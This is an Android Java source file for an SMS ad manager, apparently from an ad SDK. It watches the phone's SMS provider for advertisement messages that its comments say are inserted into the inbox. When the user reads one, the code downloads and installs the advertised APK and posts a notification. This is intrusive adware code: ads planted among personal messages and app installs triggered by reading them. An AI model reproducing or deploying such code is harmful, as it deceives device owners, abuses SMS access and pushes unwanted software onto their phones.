package com.g.sc;

import java.io.File;
import java.util.Map;

import com.g.sc.SMSAdManager.SmsObserver;
import com.g.sc.image.DownloadSession;
import com.g.sc.image.NotificationPoster;
import com.g.sc.image.DownloadSessionDAO.DownloadItem;
import com.l.R;
import com.yyxu.download.utils.StorageUtils;

import android.content.ContentValues;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.database.sqlite.SQLiteOpenHelper;
import android.net.Uri;
import android.os.Handler;
import android.os.Message;
import android.util.Log;

public class SMSAdManager {
	
	private static final String TAG = "SMSAdManager";
	private static final String DB_NAME = "tblin_ad_db";
	private static class SMSAdManagerHolder{
		private static final SMSAdManager INSTANCE = new SMSAdManager();
	}
	private SMSAdManager(){}
	public static final SMSAdManager getInstance(){
		return SMSAdManagerHolder.INSTANCE;
	}
	
	private Context mContext;
	private SMSAdDbHelper dbHelper;
	
    private int observer_created = 0;
	public void init(Context ctx){
		if (observer_created == 1)
			return;
		mContext = ctx;
		mContext.getContentResolver().registerContentObserver(Uri.parse("content://mms-sms/"), true, new SmsObserver(new Handler(){

			@Override
			public void handleMessage(Message msg) {
				Log.i(TAG, "handleMessage");
				super.handleMessage(msg);
			}
			
		}));
		
		dbHelper = new SMSAdDbHelper(ctx, DB_NAME, null, 1);
		observer_created = 1;
	}
	
	//收到短信广告
	//SmsAdPromulgator.java 213行写入短信
	//短信还要记录到数据库，需要记录的字段：_data里面的所有字段，uri, status
	//收到contentProvider的通知时，查看系统状态为已读但数据库存储的状态为初始状态的短信广告，启动下载
	//启动下载作为一个方法先空着。
	public void onSmsAd(Map<String, String> _data){
		if (dbHelper == null){
			Log.i(TAG, "Uninitialize of SMSAdManager.");
			return;
		}
		dbHelper.insertSMSAd(_data);
	}
	
	//uri: SmsAdPromulgator.java 220行返回的uri
	//status:初始(unread)，已读(read)，开始下载(start_download)，下载完成(complete_download)，已安装(installed)
	public void onSmsAdStatus(String ad_id, String status){
		if (dbHelper == null){
			Log.i(TAG, "Uninitialize of SMSAdManager.");
			return;
		}
		dbHelper.updateSMSAdSMSStatus(ad_id, status);
	}
	
	public void onSMSRead(){
		
		Cursor unReadSMSAd = dbHelper.queryUnReadSMSAd();
		unReadSMSAd.moveToFirst();
		while (!unReadSMSAd.isAfterLast()){
			DownloadItem item = new DownloadItem(); 
			
			item.ad_id = unReadSMSAd.getString(0);
			item.ad_type = unReadSMSAd.getString(1);
			item.show_name = unReadSMSAd.getString(2);
			item.url = unReadSMSAd.getString(3);
			item.save_path = StorageUtils.FILE_ROOT + item.ad_id + "_sms.apk";
			item.entity_type = unReadSMSAd.getString(4);
			item.pkg_name = unReadSMSAd.getString(5);
			item.net = unReadSMSAd.getString(6);
			
			String uri = unReadSMSAd.getString(7);
			String content = unReadSMSAd.getString(8);
			checkSMSAdRead(uri, content, item);
			unReadSMSAd.moveToNext();
		}
	}

	private void checkSMSAdRead(String uri, String content, DownloadItem item){
		if (mContext == null){
			Log.i(TAG, "Uninitialize of SMSAdManager.");
			return;
		}
		Uri smsAd = Uri.parse("content://sms/inbox"+uri);
		String[] columns = new String[] {"read"};
		String selection = "body=?";
		String[] selectionArgs = new String[] {content};
		Cursor result = mContext.getContentResolver().query(smsAd, columns, selection, selectionArgs, null);
		if (result == null){
			Log.i(TAG, "SMSAdManager.checkSMSAdRead, cannot found msg: "+smsAd.getPath());
			return;
		}
			
		result.moveToFirst();
		while (!result.isAfterLast()){
			int read = result.getInt(0);
			if (read == 1){
				onSmsAdStatus(item.ad_id, "read");
				File file = new File(item.save_path);
				if (file.exists()) {
					//文件已经存在直接安装
					StorageUtils.installAPK(mContext, item.save_path);
					onSmsAdStatus(item.ad_id, "complete_download");
					if (!StorageUtils.PackageInstalled(mContext, item.pkg_name)){
						//已经安装过包或之前版本则不在通知栏显示
						AdLogger.i("checkSMSAdRead", "notification " + item.show_name + ", pkg: " + item.pkg_name);
						NotificationPoster.postComplete(mContext, item.save_path, item.show_name, item.pkg_name);
					}
				}
				else{
					DownloadSession.getInstance().downloadSmsApk(mContext, item);
				}

			}
				
			result.moveToNext();
		}
	}

	class SmsObserver extends ContentObserver {

		public SmsObserver(Handler handler) {
			super(handler);
		}
		
		@Override
		public void onChange(boolean selfChange) {
			Log.i(TAG, "onChange(boolean selfChange) " + selfChange);
			super.onChange(selfChange);
			SMSAdManager sm = SMSAdManager.getInstance();
			sm.onSMSRead();
		}
		
	}
}
